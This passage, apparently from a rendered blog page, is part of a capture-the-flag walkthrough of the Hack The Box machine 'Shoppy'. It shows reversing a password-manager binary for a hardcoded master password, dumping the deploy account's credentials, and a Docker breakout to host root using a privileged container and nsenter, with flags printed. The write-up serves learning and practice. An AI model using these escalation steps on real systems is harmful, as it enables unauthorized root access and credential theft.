+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ssh</span> jaeger@shoppy.htb
+</span></span><span class=line><span class=cl>jaeger@shoppy.htb<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Linux shoppy 5.10.0-18-amd64 <span class=c1>#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class=line><span class=cl>jaeger@shoppy:~$ cat user.txt
+</span></span><span class=line><span class=cl>4dab25e19cc209a12a72caddc545f46e
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>Checking sudo access, I can run /home/deploy/password-manager, which was mentioned somewhere in the mattermost chat:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jaeger@shoppy:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> jaeger on shoppy:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User jaeger may run the following commands on shoppy:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>deploy<span class=o>)</span> /home/deploy/password-manager
+</span></span></code></pre></td></tr></table></div></div><p>Running a `strings /home/deploy/password-manager shows a credentials text file, which I cannot cat myself directly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jaeger@shoppy:~$ strings /home/deploy/password-manager
+</span></span><span class=line><span class=cl>&lt;.. snip ..&gt;
+</span></span><span class=line><span class=cl>Welcome to Josh password manager!
+</span></span><span class=line><span class=cl>Please enter your master password: 
+</span></span><span class=line><span class=cl>Access granted! Here is creds !
+</span></span><span class=line><span class=cl>cat /home/deploy/creds.txt
+</span></span><span class=line><span class=cl>Access denied! This incident will be reported !
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>jaeger@shoppy:~$ cat /home/deploy/creds.txt
+</span></span><span class=line><span class=cl>cat: /home/deploy/creds.txt: Permission denied
+</span></span><span class=line><span class=cl>jaeger@shoppy:~$ ls -la /home/deploy/creds.txt 
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> deploy deploy <span class=m>56</span> Jul <span class=m>22</span> 13:15 /home/deploy/creds.txt
+</span></span></code></pre></td></tr></table></div></div><p>So I am able to run the password manager, but need the master pass, or to somehow bypass this..</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+</span></span><span class=line><span class=cl>Welcome to Josh password manager!
+</span></span><span class=line><span class=cl>Please enter your master password: remembermethisway
+</span></span><span class=line><span class=cl>Access denied! This incident will be reported !
+</span></span></code></pre></td></tr></table></div></div><p>In /home/deploy, there is a password-manager.cpp which we cannot read. This is in line with the mattermost chat where Josh mentions creating a password manager in C++.</p><p>We have access to the compiled binary, so let&rsquo;s take a copy to play with locally:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>scp jaeger@shoppy.htb:/home/deploy/password-manager .
+</span></span><span class=line><span class=cl>jaeger@shoppy.htb<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>password-manager                                                                    100%   18KB 454.9KB/s   00:00   
+</span></span></code></pre></td></tr></table></div></div><p>Taking a look at the decompiled main function in Ghidra, it looks like we call the += operator in order to concatenate and build a string stored in variable local_68, which we compare to local_48 (which is std::cin &ndash; i.e. the standard input stream).</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./2022-12-26-18-30-13-image.png data-srcset="./2022-12-26-18-30-13-image.png, ./2022-12-26-18-30-13-image.png 1.5x, ./2022-12-26-18-30-13-image.png 2x" data-sizes=auto alt=./2022-12-26-18-30-13-image.png title=./2022-12-26-18-30-13-image.png></p><p>So, the app expects &ldquo;Sample&rdquo; &ndash; let&rsquo;s try that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+</span></span><span class=line><span class=cl>Welcome to Josh password manager!
+</span></span><span class=line><span class=cl>Please enter your master password: Sample
+</span></span><span class=line><span class=cl>Access granted! Here is creds !
+</span></span><span class=line><span class=cl>Deploy Creds :
+</span></span><span class=line><span class=cl>username: deploy
+</span></span><span class=line><span class=cl>password: Deploying@pp!
+</span></span></code></pre></td></tr></table></div></div><p>I can now ssh into the deploy account, and confirm the password manager logic above based on the c++ source:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Welcome to Josh password manager!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Please enter your master password: &#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>master_password</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;S&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;a&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;m&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;p&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;l&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>master_password</span> <span class=o>+=</span> <span class=s>&#34;e&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>password</span><span class=p>.</span><span class=n>compare</span><span class=p>(</span><span class=n>master_password</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Access granted! Here is creds !&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat /home/deploy/creds.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Access denied! This incident will be reported !&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>I tried clobbering cat in $PATH to privesc, when logged in as jaeger and entering the password &ndash; but remembered sudoers is set so you cannot preserve the environment, and /home/deploy/password-manager only runs as the deploy user anyway.</p><p>I then remembered in matter most chat, there was mention of the deploy account being used and it would be deploying via docker.. So, let&rsquo;s see if we can access docker, if there are any images (HTB boxes do not have internet access, so cannot pull down container images from dockerhub), and if we can run a privileged container to try get root on the host.</p><p>Docker based privilege escalation is new to me, and not something I have experience with &ndash; but I was able to consult the always excellent HackTricks - <a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation target=_blank rel="noopener noreffer">Docker Breakout / Privilege Escalation - HackTricks</a></p><p>Luckily, we have access to an alpine image we can use to spin up a privileged container. Inside the container we run nsenter:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ docker images
+</span></span><span class=line><span class=cl>REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
+</span></span><span class=line><span class=cl>alpine       latest    d7d3d98c851f   <span class=m>5</span> months ago   5.53MB
+</span></span><span class=line><span class=cl>$ docker run -it --rm --pid<span class=o>=</span>host --privileged alpine /bin/sh
+</span></span><span class=line><span class=cl>/ <span class=c1>#</span>
+</span></span><span class=line><span class=cl>/ <span class=c1># nsenter --target 1 --mount --uts --ipc --net --pid -- bash</span>
+</span></span><span class=line><span class=cl>root@shoppy:/#
+</span></span><span class=line><span class=cl>root@shoppy:/# cat /root/root.txt
+</span></span><span class=line><span class=cl>0961d847a56840c545b2f26d78796dc0
+</span></span></code></pre></td></tr></table></div></div><p>We get contexts from our init process (PID 1), and enter the IPC, network and PID namespaces &ndash; which are located in /proc/1/ns/ within the container&rsquo;s filesystem.</p><p>Excellent, we have the root flag!&mldr;</p><h1 id=conclusion>Conclusion</h1><p>A fun little VM that required back tracking and checking assumptions a couple of times. It&rsquo;s easy to jump to the conclusion of SQL injection and become fixated on this, but these assumptions need to be tested and confirmed early on. I went down a little bit of a rabbit hole looking at WAF bypass techniques assuming the gateway timeouts were actually a WAF I needed to work around before SQL injection would work.</p><p>Fuzzing with fuff or similar early on and trying out different special characters while checking the HTTP response for a 302 may have helped confirm this was a NoSQL datbase.</p><p>Finding the mattermost virtualhost was also a little tricky, and sometimes you just have to rely on getting lucky with scans and using the right wordlist.. Although sticking to common lists made this easy. I found the Prometheus logs after revisiting open ports with a full nmap scan, but didn&rsquo;t think much of it at the time &ndash; but I should have searched more keywords here, which may have helped identify the mattermost virtual host without having to bruteforce using a wordlist.</p><p>Docker based privilege escalation and <code>nsenter</code> is not something I&rsquo;ve seen or used before, so I&rsquo;m keen to deep dive a little more.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-01-15&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/fb608b5f2cbfb3c2ccabf269306353304e2b807c target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) fb608b5f2cbfb3c2ccabf269306353304e2b807c: shoppy walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>fb608b5</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-01-14-shoppy-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-01-14-shoppy-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-01-14-shoppy-htb/ data-title="Shoppy HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-01-14-shoppy-htb/ data-title="Shoppy HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-01-14-shoppy-htb/ data-title="Shoppy HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pentesting/>pentesting</a>,&nbsp;<a href=/tags/infosec/>infosec</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/docker/>docker</a>,&nbsp;<a href=/tags/reversing/>reversing</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2021-03-28-learning-update/ class=prev rel=prev title="My Current Dev Setup and Activity"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>My Current Dev Setup and Activity</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
